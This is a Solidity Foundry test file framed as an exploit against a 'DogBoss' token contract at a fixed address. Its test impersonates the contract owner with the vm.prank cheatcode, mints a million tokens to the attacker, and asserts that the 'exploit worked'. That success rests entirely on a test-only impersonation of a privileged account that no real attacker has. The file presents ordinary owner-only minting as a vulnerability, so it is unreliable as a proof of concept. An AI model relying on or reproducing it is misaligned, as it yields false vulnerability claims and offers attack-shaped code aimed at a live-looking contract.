pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function mint(address account, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during the exploit
        // The test contract already has TARGET and attacker defined
        // We'll fetch the owner address from the contract
        address owner = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).owner();
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "DogBoss Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get initial balances
        uint256 initialBalance = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).balanceOf(attacker);
        uint256 initialTotalSupply = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).totalSupply();
        uint256 initialERC20Balance = IERC20(TARGET).balanceOf(address(this));

        // Get owner address
        address owner = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).owner();

        // Impersonate the owner to call mint()
        vm.prank(owner);

        // Mint a large amount of tokens to attacker
        // Using 1,000,000 tokens with 18 decimals (common for ERC20)
        uint256 mintAmount = 1_000_000 * 10**18;
        DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).mint(attacker, mintAmount);

        // Get final balances
        uint256 finalBalance = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).balanceOf(attacker);
        uint256 finalTotalSupply = DogBoss_0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C(TARGET).totalSupply();
        uint256 finalERC20Balance = IERC20(TARGET).balanceOf(address(this));

        // Verify the exploit worked
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
        assertEq(finalBalance, initialBalance + mintAmount, "Attacker should receive exact mint amount");
        assertEq(finalTotalSupply, initialTotalSupply + mintAmount, "Total supply should increase by mint amount");
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

